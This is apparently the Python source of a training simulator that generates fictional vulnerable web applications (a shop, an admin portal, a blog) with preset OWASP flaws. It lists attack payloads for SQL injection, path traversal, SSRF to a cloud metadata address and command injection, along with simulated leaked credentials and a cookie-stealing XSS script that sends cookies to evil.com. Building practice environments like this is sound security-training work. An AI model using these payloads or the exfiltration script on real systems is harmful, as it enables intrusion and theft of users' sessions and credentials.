"""Web Application Generator — procedurally scaffolds vulnerable web applications.

Takes configuration parameters and generates a realistic web application
with HTTP routes, framework metadata, and OWASP Top 10 vulnerabilities
injected into specific endpoints.
"""

from __future__ import annotations

import random
from typing import Any

from openworlds.world_engine.models import (
    Host,
    WebApp,
    WebRoute,
    WebVulnerability,
    WebVulnType,
)

# ---------------------------------------------------------------------------
# Application Templates
# ---------------------------------------------------------------------------

APP_TEMPLATES: dict[str, dict[str, Any]] = {
    "ecommerce": {
        "name": "CorpShop",
        "framework": "php",
        "tech_stack": ["PHP 8.2", "MySQL 8.0", "Apache 2.4"],
        "server_header": "Apache/2.4.57 (Ubuntu)",
        "db_name": "shop_db",
        "db_users_table": "customers",
        "routes": [
            {"path": "/", "description": "Homepage"},
            {"path": "/login", "methods": ["GET", "POST"], "parameters": ["username", "password"], "description": "Login page"},
            {"path": "/register", "methods": ["GET", "POST"], "parameters": ["username", "email", "password"], "description": "Registration"},
            {"path": "/products", "description": "Product listing"},
            {"path": "/product", "parameters": ["id"], "description": "Single product view"},
            {"path": "/search", "parameters": ["q"], "description": "Search products"},
            {"path": "/cart", "auth_required": True, "description": "Shopping cart"},
            {"path": "/checkout", "methods": ["GET", "POST"], "auth_required": True, "description": "Checkout page"},
            {"path": "/account/profile", "auth_required": True, "parameters": ["user_id"], "description": "User profile"},
            {"path": "/account/orders", "auth_required": True, "description": "Order history"},
            {"path": "/admin/dashboard", "auth_required": True, "hidden": True, "description": "Admin panel"},
            {"path": "/admin/users", "auth_required": True, "hidden": True, "parameters": ["id"], "description": "Admin user management"},
            {"path": "/api/v1/products", "response_type": "json", "description": "Product API"},
            {"path": "/api/v1/users", "response_type": "json", "auth_required": True, "hidden": True, "description": "Users API"},
            {"path": "/download", "parameters": ["file"], "description": "File download"},
            {"path": "/robots.txt", "description": "Robots file"},
            {"path": "/sitemap.xml", "description": "Sitemap"},
            {"path": "/.env", "hidden": True, "description": "Environment file (leaked)"},
            {"path": "/backup", "hidden": True, "description": "Backup directory"},
            {"path": "/phpmyadmin", "hidden": True, "description": "Database admin panel"},
        ],
        "vulns": [
            {"vuln_type": "sqli", "route_path": "/product", "injection_point": "id",
             "trigger_payload": "' OR 1=1--",
             "exploited_response": "admin|admin@corp.local|$2b$12$LJ3m4yK9v...(hashed)|John Admin\nmaria.garcia|m.garcia@corp.local|$2b$12$Xk9p2R1v...(hashed)|Maria Garcia\nj.smith|j.smith@corp.local|$2b$12$Qw8n3P5t...(hashed)|John Smith"},
            {"vuln_type": "xss", "route_path": "/search", "injection_point": "q",
             "trigger_payload": "<script>",
             "exploited_response": "<h2>Search results for: <script>alert('XSS')</script></h2><p>No products found.</p>"},
            {"vuln_type": "lfi", "route_path": "/download", "injection_point": "file",
             "trigger_payload": "../../",
             "exploited_response": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false"},
            {"vuln_type": "idor", "route_path": "/account/profile", "injection_point": "user_id",
             "trigger_payload": "1",
             "exploited_response": '{"user_id": 1, "username": "admin", "email": "admin@corp.local", "role": "administrator", "api_key": "sk-a8f3b2c1d4e5f6a7b8c9d0e1f2a3b4c5"}'},
        ],
    },
    "admin_portal": {
        "name": "InternalAdmin",
        "framework": "django",
        "tech_stack": ["Python 3.11", "PostgreSQL 15", "gunicorn", "nginx"],
        "server_header": "nginx/1.24.0",
        "db_name": "internal_db",
        "db_users_table": "auth_user",
        "routes": [
            {"path": "/", "description": "Login redirect"},
            {"path": "/login", "methods": ["GET", "POST"], "parameters": ["username", "password"], "description": "Login"},
            {"path": "/dashboard", "auth_required": True, "description": "Main dashboard"},
            {"path": "/users", "auth_required": True, "description": "User list"},
            {"path": "/users/edit", "auth_required": True, "methods": ["GET", "POST"], "parameters": ["id"], "description": "Edit user"},
            {"path": "/settings", "auth_required": True, "description": "System settings"},
            {"path": "/logs", "auth_required": True, "description": "Audit logs"},
            {"path": "/api/health", "response_type": "json", "description": "Health check"},
            {"path": "/api/config", "response_type": "json", "auth_required": True, "hidden": True, "description": "Config dump"},
            {"path": "/debug", "hidden": True, "description": "Debug console (Django debug mode)"},
            {"path": "/static/js/app.js", "description": "Frontend JS bundle"},
            {"path": "/.git/config", "hidden": True, "description": "Exposed git config"},
        ],
        "vulns": [
            {"vuln_type": "sqli", "route_path": "/users/edit", "injection_point": "id",
             "trigger_payload": "' UNION SELECT",
             "exploited_response": "1|admin|admin@internal.corp|pbkdf2_sha256$...|superuser\n2|svc_backup|backup@internal.corp|pbkdf2_sha256$...|staff\n3|j.developer|dev@internal.corp|pbkdf2_sha256$...|user"},
            {"vuln_type": "ssrf", "route_path": "/api/health", "injection_point": "url",
             "trigger_payload": "http://169.254.169.254",
             "exploited_response": '{"Code": "Success", "LastUpdated": "2024-01-15T10:30:00Z", "Type": "AWS-HMAC", "AccessKeyId": "AKIAIOSFODNN7EXAMPLE", "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "Token": "FwoGZXIvYXdzE..."}'},
            {"vuln_type": "rce", "route_path": "/debug", "injection_point": "cmd",
             "trigger_payload": ";",
             "exploited_response": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\nLinux webapp01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux"},
        ],
    },
    "blog": {
        "name": "CorpBlog",
        "framework": "express",
        "tech_stack": ["Node.js 20", "MongoDB 7", "Express 4.18"],
        "server_header": "Express",
        "db_name": "blog_db",
        "db_users_table": "users",
        "routes": [
            {"path": "/", "description": "Blog homepage"},
            {"path": "/posts", "description": "All posts"},
            {"path": "/post", "parameters": ["slug"], "description": "Single post"},
            {"path": "/login", "methods": ["GET", "POST"], "parameters": ["email", "password"], "description": "Login"},
            {"path": "/register", "methods": ["GET", "POST"], "parameters": ["name", "email", "password"], "description": "Register"},
            {"path": "/profile", "auth_required": True, "parameters": ["id"], "description": "User profile"},
            {"path": "/api/posts", "response_type": "json", "description": "Posts API"},
            {"path": "/api/comments", "methods": ["GET", "POST"], "response_type": "json", "parameters": ["post_id", "body"], "description": "Comments API"},
            {"path": "/admin", "auth_required": True, "hidden": True, "description": "Admin panel"},
            {"path": "/api/debug/env", "response_type": "json", "hidden": True, "description": "Debug env dump"},
            {"path": "/uploads", "hidden": True, "description": "Upload directory"},
        ],
        "vulns": [
            {"vuln_type": "xss", "route_path": "/api/comments", "injection_point": "body",
             "trigger_payload": "<script>",
             "exploited_response": '{"id": 42, "post_id": 1, "body": "<script>document.location=\'http://evil.com/steal?c=\'+document.cookie</script>", "author": "anonymous", "created_at": "2024-01-15T10:30:00Z"}'},
            {"vuln_type": "idor", "route_path": "/profile", "injection_point": "id",
             "trigger_payload": "1",
             "exploited_response": '{"id": 1, "name": "Admin User", "email": "admin@blog.corp", "role": "admin", "password_hash": "$2b$12$LJ3m4yK9v..."}'},
            {"vuln_type": "auth_bypass", "route_path": "/admin", "injection_point": "role",
             "trigger_payload": "admin",
             "exploited_response": "<h1>Admin Dashboard</h1><p>Welcome, admin!</p><ul><li>Total Users: 847</li><li>Total Posts: 2,341</li><li>Pending Reviews: 12</li></ul>"},
        ],
    },
}


class WebAppGenerator:
    """Generates realistic web applications with OWASP vulnerabilities."""

    def __init__(self, seed: int = 42) -> None:
        self.rng = random.Random(seed)

    def generate(
        self,
        host: Host,
        template_name: str | None = None,
        port: int = 8080,
    ) -> WebApp:
        """Generate a WebApp and attach it to a Host.

        Args:
            host: The Host object running this web application.
            template_name: One of 'ecommerce', 'admin_portal', 'blog', or None for random.
            port: The port the web app runs on.

        Returns:
            A fully populated WebApp model.
        """
        if template_name is None:
            template_name = self.rng.choice(list(APP_TEMPLATES.keys()))

        tpl = APP_TEMPLATES[template_name]

        base_url = f"http://{host.ip}:{port}"

        routes = [WebRoute(**r) for r in tpl["routes"]]
        vulns = [
            WebVulnerability(vuln_type=WebVulnType(v["vuln_type"]), **{k: v[k] for k in v if k != "vuln_type"})
            for v in tpl["vulns"]
        ]

        return WebApp(
            name=tpl["name"],
            base_url=base_url,
            framework=tpl["framework"],
            tech_stack=tpl["tech_stack"],
            routes=routes,
            vulnerabilities=vulns,
            server_header=tpl["server_header"],
            db_name=tpl["db_name"],
            db_users_table=tpl["db_users_table"],
        )

    def generate_random(self, host: Host) -> WebApp:
        """Generate a random web app and assign to a host."""
        port = self.rng.choice([80, 443, 8080, 8443, 3000, 5000])
        return self.generate(host, port=port)
